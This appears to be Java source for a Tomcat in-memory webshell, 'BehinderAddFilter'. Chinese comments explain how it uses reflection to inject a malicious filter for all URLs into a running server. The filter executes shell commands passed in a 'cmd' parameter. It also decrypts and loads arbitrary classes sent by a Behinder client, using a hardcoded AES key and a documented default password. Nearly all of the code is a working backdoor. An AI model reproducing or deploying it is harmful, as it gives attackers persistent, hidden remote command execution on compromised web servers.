import javax.servlet.*;
import java.io.IOException;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Method;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Scanner;
import java.io.InputStream;
// tomcat89
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

public class BehinderAddFilter implements Filter {

    static{
        try{
            final String name = "AutoAddFilter";
            final String urlPattern = "/*";
            // 获取 standardContext
            /* org.apache.catalina.core.StandardContext容器类负责存储整个Web应用程序的数据和对象，并加载了web.xml中配置
               的多个Servlet、Filter对象以及它们的映射关系。*/
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null){
                Filter filter = new BehinderAddFilter();

                // 生成 FilterDef
                // filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应FilterDef的对象的键值对
                // FilterDef 对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                // 设置 FilterMap
                // 使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了,其他中间件应该也是类似的
                // filterMaps 中的FilterMap则记录了不同filter与UrlPattern的映射关系
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                //设置 FilterConfig
                //在ApplicationFilterConfig对象中则存储了Filter实例以及该实例在web.xml中的注册信息
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                filterConfigs.put(name,filterConfig);
            }
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }
    public void init(FilterConfig config) throws ServletException {
        System.out.println("BehinderAddFilter Start ......");
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        try {
            System.out.println("Do Filter ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request",request);
            pageContext.put("response",response);
            pageContext.put("session",session);

            // Behinder MemShell
            if (request.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";  /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //revision Behinder
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }
}
